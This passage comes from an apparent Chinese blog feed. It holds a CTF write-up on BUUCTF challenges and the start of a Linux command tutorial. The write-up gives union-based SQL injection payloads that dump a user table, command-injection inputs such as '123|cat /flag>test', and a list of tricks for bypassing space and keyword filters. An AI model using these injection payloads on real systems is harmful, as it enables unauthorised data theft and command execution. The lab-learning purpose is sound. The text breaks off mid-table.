alt="image-20220322123021799"></strong></p><pre><code>附加几种常见的sql_mode值的介绍：几种常见的mode介绍ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。如果开启此模式，2016-01-00是不允许的，但是0000-02-01是允许的。它实际的行为受到 strict mode是否开启的影响1。NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响2。ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULLNO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</code></pre><h1 id="无注释闭合sql注入"><a href="#无注释闭合sql注入" class="headerlink" title="无注释闭合sql注入"></a>无注释闭合sql注入</h1><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL">BUUCTF[极客大挑战 2019]LoveSQL</a></p><p>打开发现是登录框,直接抓一下数据</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221446574.png" alt="image-20220322144646473"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221447768.png" alt="image-20220322144741735"></p><p>发现是像check.php发送请求了,测试下闭合方式</p><pre><code>check.php?username=1&#39;&amp;password=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221448755.png" alt="image-20220322144822714"></p><p>单引号闭合,无括号</p><p>万能密码登录一下</p><pre><code>check.php?username=admin&amp;password=1&#39; or &#39;1&#39;=&#39;1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221456107.png" alt="image-20220322145600027"></p><p>这个解密不出来</p><p>查字段数</p><pre><code>check.php?username=admin&amp;password=1&#39; union select 1,2,3,4 or &#39;1&#39;=&#39;1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221456030.png" alt="image-20220322145657980"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221457088.png" alt="image-20220322145709022"></p><p>那么就是三个了,在2这里有回显,这里需要注意这里的1并不是字段1的值而是永真条件的1这里是不能利用的.也可以这么闭合</p><pre><code>check.php?username=admin&amp;password=1&#39; union select 1,2,&#39;3</code></pre><p>接着查数据库</p><pre><code>username=admin&amp;password=1&#39; union select 1,database(),&#39;3</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221459115.png" alt="image-20220322145913037"></p><p>查表</p><pre><code>check.php?username=admin&amp;password=1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#39;3</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221505419.png" alt="image-20220322150501363"></p><p>查字段名</p><pre><code>check.php?username=admin&amp;password=1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;l0ve1ysq1&quot;),&#39;3</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221506513.png" alt="image-20220322150638446"></p><p>得数据</p><pre><code>check.php?username=admin&amp;password=1&#39; union select 1,(select group_concat(username,password) from l0ve1ysq1),&#39;3</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221507016.png" alt="image-20220322150738985"></p><h1 id="命令执行之进程监控绕过"><a href="#命令执行之进程监控绕过" class="headerlink" title="命令执行之进程监控绕过"></a>命令执行之进程监控绕过</h1><p>使用 | 来绕过并使用写入文件的方法二次返回查看结果</p><pre><code>123|ls ../../../&gt;test</code></pre><p>查找flag文件的存在</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221244378.png" alt="image-20220322124456330"></p><p>找到之后在通过网页直接访问</p><pre><code>http://114.67.175.224:16803/test</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221245726.png" alt="image-20220322124512696"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221245437.png" alt="image-20220322124531390"></p><p>下载下来一个文件</p><p>同理查看flag</p><pre><code>123|cat /flag&gt;test1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221246749.png" alt="image-20220322124607710"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221246475.png" alt="image-20220322124618442"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221246518.png" alt="image-20220322124630488"></p><h1 id="linux-空格过滤绕过"><a href="#linux-空格过滤绕过" class="headerlink" title="linux 空格过滤绕过"></a>linux 空格过滤绕过</h1><p><a href="https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping">BUUCTF[GXYCTF2019]Ping Ping Ping</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221332343.png" alt="image-20220322133232247"></p><p>发现提示ip,那么添加上发现是一个命令执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221335633.png" alt="image-20220322133559594"></p><pre><code>?ip=1||ls</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221336870.png" alt="image-20220322133615843"></p><p>发现flag.php与index.php那么现在就是读取文件了</p><pre><code>?ip=1||cat flag.php</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221337339.png" alt="image-20220322133758302"></p><p>发现过滤了空格,想办法绕过空格，大题有以下思路</p><pre><code>cat flag.phpcat$&#123;IFS&#125;flag.phpcat$IFS$9flag.phpcat&lt;flag.txtcat&lt;&gt;flag.txt$1&#123;cat,flag.php&#125; //用逗号实现了空格功能%20%09</code></pre><p>有时 cat 可能被过滤，那么尝试用 tac，反向输出；或者 linux命令中可以加 \，所以甚至可以 ca\t &#x2F;fl\ag</p><pre><code>?ip=1||cat$IFSflag.php</code></pre><p>发现flag也被过滤</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221340128.png" alt="image-20220322134002100"></p><pre><code>这里尝试了一下只有?ip=1||cat$IFS$1index.php可用</code></pre><p>&#96;&#96;&#96;php<br>&lt;?php<br>if(isset($_GET[‘ip’])){<br>    $ip &#x3D; $_GET[‘ip’];&#x2F;*<br>&#x2F;&amp;|/|?|*|&lt;|[\x{00}-\x{1f}]|&gt;|&#39;|&quot;|\|(|)|[|]|{|}&#x2F;<br>表示匹配&amp;&#x2F;?*&lt;匹配\x00-\x1f之间的&gt;’”()[]{}<br>*&#x2F;<br>    if(preg_match(“&#x2F;&amp;|/|?|*|&lt;|[\x{00}-\x{1f}]|&gt;|&#39;|&quot;|\|(|)|[|]|{|}&#x2F;“, $ip, $match)){<br>        echo preg_match(“&#x2F;&amp;|/|?|*|&lt;|[\x{00}-\x{20}]|&gt;|&#39;|&quot;|\|(|)|[|]|{|}&#x2F;“, $ip, $match);<br>        die(“fxck your symbol!”);<br>    } else if(preg_match(“&#x2F; &#x2F;“, $ip))</p>]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习(一)</title>
      <link href="/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
      <url>/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="linux操作学习-一"><a href="#linux操作学习-一" class="headerlink" title="linux操作学习(一)"></a>linux操作学习(一)</h1><h2 id="常用linux命令"><a href="#常用linux命令" class="headerlink" title="常用linux命令"></a>常用linux命令</h2><pre><code>man man 查看man的帮助信息</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203190950684.png" alt="image-20220319095025568"></p><p>man命令中常用按键以及作用</p><table><thead><tr><th align="left">按键</th><th>作用</th></tr></thead><tbody><tr><td align="left">空格键</td><td>向下翻一页</td></tr><tr><td align="left">PaGe down</td><td>向下翻一页</td></tr><tr><td align="left">PaGe up</td><td>向上翻一页</td></tr><tr><td align="left">home</td><td>直接前往首页</td></tr><tr><td align="left">end</td><td>直接前往尾页</td></tr><tr><td align="left">&#x2F;</td><td>从上至下搜索某个关键词，如“&#x2F;linux”</td></tr><tr><td align="left">?</td><td>从下至上搜索某个关键词，如“?linux”</td></tr><tr><td align="left">n</td><td>定位到下一个搜索到的关键词</td></tr><tr><td align="left">N</td><td>定位到上一个搜索到的关键词</td></tr><tr><td align="left">q</td><td>退出帮助文档</td></tr></tbody></table><p> man命令中帮助信息的结构以及意义</p><table><thead><tr><th>结构名称</th><th>代表意义</th></tr></thead><tbody><tr><td>NAME</td><td>命令的名称</td></tr><tr><td>SYNOPSIS</td><td>参数的大致使用方法</td></tr><tr><td>DESCRIPTION</td><td>介绍说明</td></tr><tr><td>EXAMPLES</td><td>演示（附带简单说明）</td></tr><tr><td>OVERVIEW</td><td>概述</td></tr><tr><td>DEFAULTS</td><td>默认的功能</td></tr><tr><td>OPTIONS</td><td>具体的可用选项（带介绍）</td></tr><tr><td>ENVIRONMENT</td><td>环境变量</td></tr><tr><td>FILES</td><td>用到的文件</td></tr><tr><td>SEE ALSO</td><td>相关的资料</td></tr><tr><td>HISTORY</td><td>维护历史与联系方式</td></tr></tbody></table><p><strong>Tab键</strong></p><p>它能够实现对命令、参数或文件的内容补全</p><pre><code>re&lt;Tab键&gt;&lt;Tab键&gt;read                readlink            realpath </code></pre><p><strong>ctrl+c</strong></p><p>当同时按下键盘上的Ctrl和字母c的时候，意味着终止当前进程的运行。假如执行了一个错误命令，或者是执行某个命令后迟迟无法结束，这时就可以冷静地按下Ctrl+c组合键，命令行终端的控制权会立刻回到我们手中。</p><p><strong>Ctrl+d</strong></p><p>当同时按下键盘上的Ctrl和字母d的时候，表示键盘输入结束。</p><p><strong>Ctrl+l</strong></p><p>当同时按下键盘上的Ctrl和字母l的时候，会清空当前终端中已有的内容（相当于清屏操作）</p><h3 id="常用系统工作命令"><a href="#常用系统工作命令" class="headerlink" title="常用系统工作命令"></a>常用系统工作命令</h3><h4 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a>echo命令</h4><p>echo命令用于在终端设备上输出字符串或变量提取后的值,语法格式为</p><pre><code>echo [字符串] [$变量]</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191005710.png" alt="image-20220319100544685"></p><h4 id="date命令"><a href="#date命令" class="headerlink" title="date命令"></a>date命令</h4><p>date命令用于显示或设置系统的时间和日期,语法格式为</p><pre><code>date [+指定的格式]</code></pre><p> date命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>%S</td><td>秒（00～59）</td></tr><tr><td>%M</td><td>分钟（00～59）</td></tr><tr><td>%H</td><td>小时（00～23）</td></tr><tr><td>%I</td><td>小时（00～12）</td></tr><tr><td>%m</td><td>月份（1~12）</td></tr><tr><td>%p</td><td>显示出AM或PM</td></tr><tr><td>%a</td><td>缩写的工作日名称（例如：Sun）</td></tr><tr><td>%A</td><td>完整的工作日名称（例如：Sunday）</td></tr><tr><td>%b</td><td>缩写的月份名称（例如：Jan）</td></tr><tr><td>%B</td><td>完整的月份名称（例如：January）</td></tr><tr><td>%q</td><td>季度（1~4）</td></tr><tr><td>%y</td><td>简写年份（例如：20）</td></tr><tr><td>%Y</td><td>完整年份（例如：2020）</td></tr><tr><td>%d</td><td>本月中的第几天</td></tr><tr><td>%j</td><td>今年中的第几天</td></tr><tr><td>%n</td><td>换行符（相当于按下回车键）</td></tr><tr><td>%t</td><td>跳格（相当于按下Tab键）</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191008337.png" alt="image-20220319100831310"></p><p>将系统时间设置为2022年3月19日10点09分的date命令如下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191010002.png" alt="image-20220319101018971"></p><p>date命令中的参数%j可用来查看今天是当年中的第几天。这个参数能够很好地区分备份时间的早晚，即数字越大，越靠近当前时间。该参数的使用方式以及显示结果如下所示</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191011172.png" alt="image-20220319101116145"></p><h4 id="timedatectl命令"><a href="#timedatectl命令" class="headerlink" title="timedatectl命令"></a>timedatectl命令</h4><p>timedatectl命令用于设置系统的时间,英文全称为”time date control”,语法格式 </p><pre><code>timedatectl [参数]</code></pre><p>timedatectl命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>status</td><td>显示状态信息</td></tr><tr><td>list-timezones</td><td>列出已知时区</td></tr><tr><td>set-time</td><td>设置系统时间</td></tr><tr><td>set-timezone</td><td>设置生效时区</td></tr></tbody></table><p>查看系统时间与时区的方法如下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191013398.png" alt="image-20220319101351367"></p><p>手动设置为上海时区</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191015650.png" alt="image-20220319101553616"></p><h4 id="reboot命令"><a href="#reboot命令" class="headerlink" title="reboot命令"></a>reboot命令</h4><p>reboot命令用于重启系统,输入改命令回车之后就可执行,需要使用root身份来操作</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191017545.png" alt="image-20220319101717518"></p><h4 id="poweroff命令"><a href="#poweroff命令" class="headerlink" title="poweroff命令"></a>poweroff命令</h4><p>poweroff命令用于关闭系统,输入该命令之后按回车即可执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191018648.png" alt="image-20220319101822622"></p><h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><p>wget命令用于在终端命令行中下载网络文件，英文全称为“web get”，语法格式为</p><pre><code>wget [参数] 网址</code></pre><p>借助于wget命令，可以无须打开浏览器，直接在命令行界面中就能下载文件</p><p>wget命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-b</td><td>后台下载模式</td></tr><tr><td>-P</td><td>下载到指定目录</td></tr><tr><td>-t</td><td>最大尝试次数</td></tr><tr><td>-c</td><td>断点续传</td></tr><tr><td>-p</td><td>下载页面内所有资源，包括图片、视频等</td></tr><tr><td>-r</td><td>递归下载</td></tr></tbody></table><h4 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h4><p>ps命令用于查看系统中的进程状态,英文全称为processes,语法 </p><pre><code>ps [参数]</code></pre><p> ps命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-a</td><td>显示所有进程（包括其他用户的进程）</td></tr><tr><td>-u</td><td>用户以及其他详细信息</td></tr><tr><td>-x</td><td>显示没有控制终端的进程</td></tr></tbody></table><p>Linux系统中时刻运行着许多进程，如果能够合理地管理它们，则可以优化系统的性能。在Linux系统中有5种常见的进程状态，分别为运行、中断、不可中断、僵死与停止，其各自含义如下所示</p><pre><code>    R（运行）：进程正在运行或在运行队列中等待。    S（中断）：进程处于休眠中，当某个条件形成后或者接收到信号时，则脱离该   状态。    D（不可中断）：进程不响应系统异步信号，即便用kill命令也不能将其中断。    Z（僵死）：进程已经终止，但进程描述符依然存在, 直到父进程调用wait4()系统函数后将进程释放。    T（停止）：进程收到停止信号后停止运行。</code></pre><p> 进程状态</p><table><thead><tr><th>USER</th><th>PID</th><th>%CPU</th><th>%MEM</th><th>VSZ</th><th>RSS</th><th>TTY</th><th>STAT</th><th>START</th><th>TIME</th><th>COMMAND</th></tr></thead><tbody><tr><td>进程的所有者</td><td>进程ID号</td><td>运算器占用率</td><td>内存占用率</td><td>虚拟内存使用量(单位是KB)</td><td>占用的固定内存量(单位是KB)</td><td>所在终端</td><td>进程状态</td><td>被启动的时间</td><td>实际使用CPU的时间</td><td>命令名称与参数</td></tr><tr><td>root</td><td>1</td><td>0.0</td><td>0.5</td><td>244740</td><td>10636</td><td>?</td><td>Ss</td><td>07:54</td><td>0:02</td><td>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;  systemd –switched-root –system –deserialize 18</td></tr><tr><td>root</td><td>2</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>S</td><td>07:54</td><td>0:00</td><td>[kthreadd]</td></tr><tr><td>root</td><td>3</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>I&lt;</td><td>07:54</td><td>0:00</td><td>[rcu_gp]</td></tr><tr><td>root</td><td>4</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>I&lt;</td><td>07:54</td><td>0:00</td><td>[rcu_par_gp]</td></tr><tr><td>root</td><td>5</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>I&lt;</td><td>07:54</td><td>0:00</td><td>[kworker&#x2F;0:0H-kbl</td></tr><tr><td>root</td><td>6</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>I&lt;</td><td>07:54</td><td>0:00</td><td>[mm_percpu_wq]</td></tr><tr><td>root</td><td>7</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>S</td><td>07:54</td><td>0:00</td><td>[ksoftirqd&#x2F;0]</td></tr><tr><td>root</td><td>8</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>I</td><td>07:54</td><td>0:00</td><td>[rcu_sched]</td></tr><tr><td>root</td><td>9</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>S</td><td>07:54</td><td>0:00</td><td>[migration&#x2F;0]</td></tr></tbody></table><h4 id="pstree命令"><a href="#pstree命令" class="headerlink" title="pstree命令"></a>pstree命令</h4><p>pstree命令用于以树状图的形式展示进程之间的关系,英文全称为process tree 输入改命令之后按回车执行即可</p><h4 id="top命令"><a href="#top命令" class="headerlink" title="top命令"></a>top命令</h4><p>top命令用于动态监控进程活动以及系统负载等信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191027751.png" alt="image-20220319102745696"></p><pre><code>    第1行：系统时间、运行时间、登录终端数、系统负载（3个数值分别为1分钟、5分钟、15分钟内的平均值，数值越小意味着负载越低）。    第2行：进程总数、运行中的进程数、睡眠中的进程数、停止的进程数、僵死的进程数。    第3行：用户占用资源百分比、系统内核占用资源百分比、改变过优先级的进程资源百分比、空闲的资源百分比等。其中数据均为CPU数据并以百分比格式显示，例如“99.9 id”意味着有99.9%的CPU处理器资源处于空闲。    第4行：物理内存总量、内存空闲量、内存使用量、作为内核缓存的内存量。    第5行：虚拟内存总量、虚拟内存空闲量、虚拟内存使用量、已被提前加载的内存量。</code></pre><h4 id="nice命令"><a href="#nice命令" class="headerlink" title="nice命令"></a>nice命令</h4><p>nice命令用于调整进程的优先级,语法格式</p><pre><code> nice 优先级数字 服务名称</code></pre><p>在top命令输出的结果中，PR和NI值代表的是进程的优先级，数字越低（取值范围是-20～19），优先级越高。在日常的生产工作中，可以将一些不重要进程的优先级调低，让紧迫的服务更多地利用CPU和内存资源，以达到合理分配系统资源的目的。例如将bash服务的优先级调整到最高</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191030964.png" alt="image-20220319103034935"></p><h4 id="pidof命令"><a href="#pidof命令" class="headerlink" title="pidof命令"></a>pidof命令</h4><p>pidof命令用于查询某个指定服务进程的pid号码值,语法格式为 </p><pre><code>pidof [参数] 服务名称</code></pre><p>每个进程的进程号码值（PID）是唯一的，可以用于区分不同的进程。例如，执行如下命令来查询本机上sshd服务程序的PID：</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191032996.png" alt="image-20220319103204966"></p><h4 id="killall命令"><a href="#killall命令" class="headerlink" title="killall命令"></a>killall命令</h4><p>killall命令用于终止某个指定名称的服务所对应的全部进程,语法格式为 </p><pre><code>killall [参数] 服务名称</code></pre><p>通常来讲，复杂软件的服务程序会有多个进程协同为用户提供服务，如果用kill命令逐个去结束这些进程会比较麻烦，此时可以使用killall命令来批量结束某个服务程序带有的全部进程。下面以httpd服务程序为例，来结束其全部进程</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191036161.png" alt="image-20220319103653129"></p><p>如果在系统终端中执行一个命令后想立即停止它，可以同时按下Ctrl +  C组合键（生产环境中比较常用的一个组合键），这样将立即终止该命令的进程。或者，如果有些命令在执行时不断地在屏幕上输出信息，影响到后续命令的输入，则可以在执行命令时在末尾添加一个&amp;符号，这样命令将进入系统后台来执行</p><h3 id="系统状态检测命令"><a href="#系统状态检测命令" class="headerlink" title="系统状态检测命令"></a>系统状态检测命令</h3><h4 id="ifconfig命令"><a href="#ifconfig命令" class="headerlink" title="ifconfig命令"></a>ifconfig命令</h4><p>ifconfig命令用于获取网卡配置与网络等信息,英文全称为 interface config,语法格式</p><pre><code>ifconfig [参数][网络设备]</code></pre><p>ifconfig命令来查看本机当前的网卡配置与网络状态等信息时，其实主要查看的就是网卡名称、inet参数后面的IP地址、ether参数后面的网卡物理地址（又称为MAC地址），以及RX、TX的接收数据包与发送数据包的个数及累计流量</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191041774.png" alt="image-20220319104134733"></p><h4 id="uname命令"><a href="#uname命令" class="headerlink" title="uname命令"></a>uname命令</h4><p>uname命令用于查看西永内核版本与系统架构等信息,英文全称为 Unix name 语法</p><pre><code>uname [-a]    </code></pre><p>在使用uname命令时，一般要固定搭配上-a参数来完整地查看当前系统的内核名称、主机名、内核发行版本、节点名、压制时间、硬件名称、硬件平台、处理器类型以及操作系统名称等信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191043609.png" alt="image-20220319104339578"></p><h4 id="uptime命令"><a href="#uptime命令" class="headerlink" title="uptime命令"></a>uptime命令</h4><p>uptime命令用于查看系统的负载信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191045462.png" alt="image-20220319104551428"></p><h4 id="free命令"><a href="#free命令" class="headerlink" title="free命令"></a>free命令</h4><p>free命令用于显示当前系统中内存的使用量信息,语法</p><pre><code>free [-h]</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191048929.png" alt="image-20220319104854896"></p><h4 id="who命令"><a href="#who命令" class="headerlink" title="who命令"></a>who命令</h4><p>who命令用于查看当前登入主机的用户终端信息</p><p>这3个简单的字母可以快速显示出所有正在登录本机的用户名称以及他们正在开启的终端信息；如果有远程用户，还会显示出来访者的IP地址</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191050327.png" alt="image-20220319105010293"></p><h4 id="last命令"><a href="#last命令" class="headerlink" title="last命令"></a>last命令</h4><p>last命令用于调取主机的被访记录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191051344.png" alt="image-20220319105112298"></p><h4 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h4><p>ping命令用于测试主机之间的网络连通性</p><pre><code>ping [参数] 主机地址</code></pre><p>ping命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-c</td><td>总共发送次数</td></tr><tr><td>-l</td><td>指定网卡名称</td></tr><tr><td>-i</td><td>每次间隔时间（秒）</td></tr><tr><td>-W</td><td>最长等待时间（秒）</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191053287.png" alt="image-20220319105305254"></p><h4 id="tracepath命令"><a href="#tracepath命令" class="headerlink" title="tracepath命令"></a>tracepath命令</h4><p>tracepath命令用于显示数据包到达目的主机途中经过的所有路由信息,语法</p><pre><code>tracepath [参数] 域名</code></pre><h4 id="netstat命令"><a href="#netstat命令" class="headerlink" title="netstat命令"></a>netstat命令</h4><p>netstat命令用于显示如网络连接 路由表 接口状态等的网络相关信息,英文全称为 netword status 语法</p><pre><code>netstat [参数]</code></pre><p>  netstat命令中的参数以及作用</p><table><thead><tr><th>-a</th><th>显示所有连接中的Socket</th></tr></thead><tbody><tr><td>-p</td><td>显示正在使用的Socket信息</td></tr><tr><td>-t</td><td>显示TCP协议的连接状态</td></tr><tr><td>-u</td><td>显示UDP协议的连接状态</td></tr><tr><td>-n</td><td>使用IP地址，不使用域名</td></tr><tr><td>-l</td><td>仅列出正在监听的服务状态</td></tr><tr><td>-i</td><td>显示网卡列表信息</td></tr><tr><td>-r</td><td>显示路由表信息</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191144807.png" alt="image-20220319114434756"></p><p>显示网卡列表</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191145017.png" alt="image-20220319114526984"></p><h4 id="history命令"><a href="#history命令" class="headerlink" title="history命令"></a>history命令</h4><p>history命令用于显示执行过的命令的历史</p><pre><code>history [-c]</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191146741.png" alt="image-20220319114648703"></p><p>历史命令会被保存到用户家目录中的.bash_history文件中。Linux系统中以点（.）开头的文件均代表隐藏文件，这些文件大多数为系统服务文件，可以用cat命令查看其文件内容：</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191147441.png" alt="image-20220319114733402"></p><p>要清空当前在主机上执行的linux命令的历史记录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191148071.png" alt="image-20220319114846042"></p><h4 id="sosreport命令"><a href="#sosreport命令" class="headerlink" title="sosreport命令"></a>sosreport命令</h4><p>sosreport命令用于收集系统配置及架构信息并输出诊断文档</p><p>当Linux系统出现故障需要联系技术支持人员时，大多数时候都要先使用这个命令来简单收集系统的运行状态和服务配置信息，以便让技术支持人员能够远程解决一些小问题，抑或让他们能提前了解某些复杂问题。在下面的输出信息中，加粗的部分是收集好的资料压缩文件以及校验码</p><h3 id="查找定位文件的命令"><a href="#查找定位文件的命令" class="headerlink" title="查找定位文件的命令"></a>查找定位文件的命令</h3><h4 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h4><p>pwd命令用于显示用户当前所处的工作目录,英文全称为 print working directory</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191154251.png" alt="image-20220319115426221"></p><h4 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h4><p>cd命令用于切换当前的工作路径,英文为 change directoey 语法格式为</p><pre><code>cd [参数] [目录]</code></pre><p>这个命令应该是最常用的一个命令了,可以使用 cd - 命令返回上一次所处的目录,使用cd .. 命令进入上级目录,以及使用 cd ~命令切换到当前用户的家目录亦或使用 cd ~username 命令切换到其他用户的家目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191158017.png" alt="image-20220319115836982"></p><h4 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h4><p>ls命令用于显示目录中的文件信息,英文全称为list 语法</p><pre><code>ls [参数] [文件名称]</code></pre><p>使用ls -a 参数能够看到全部的文件,使用 ls -l参数可以查看文件的属性,大小等详细信息.将这两个参数进行整合之后再次执行ls命令即可查看当前目录中的所有文件并输出这些文件的属性信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191201598.png" alt="image-20220319120140552"></p><p>如果想要查看目录属性信息,需要额外添加一个-d参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191202009.png" alt="image-20220319120242976"></p><h4 id="tree命令"><a href="#tree命令" class="headerlink" title="tree命令"></a>tree命令</h4><p>tree命令用于以树状图的形式列出目录内容以及结构,输入该命令之后按回车可以执行</p><p>虽然ls命令可以很便捷的查看目录内有哪些文件,但是无法直观的获取到目录内文件的层次结构</p><h4 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h4><p>find命令用于按照指定的条件来查找文件所对应的位置,语法</p><pre><code>find [查找范围] 寻找条件</code></pre><p>搜索工作一般都是通过find命令来完成的，它可以使用不同的文件特性作为寻找条件（如文件名、大小、修改时间、权限等信息），一旦匹配成功则默认将信息显示到屏幕上</p><p> find命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-name</td><td>匹配名称</td></tr><tr><td>-perm</td><td>匹配权限（mode为完全匹配，-mode为包含即可）</td></tr><tr><td>-user</td><td>匹配所有者</td></tr><tr><td>-group</td><td>匹配所有组</td></tr><tr><td>-mtime -n +n</td><td>匹配修改内容的时间（-n指n天以内，+n指n天以前）</td></tr><tr><td>-atime -n +n</td><td>匹配访问文件的时间（-n指n天以内，+n指n天以前）</td></tr><tr><td>-ctime -n 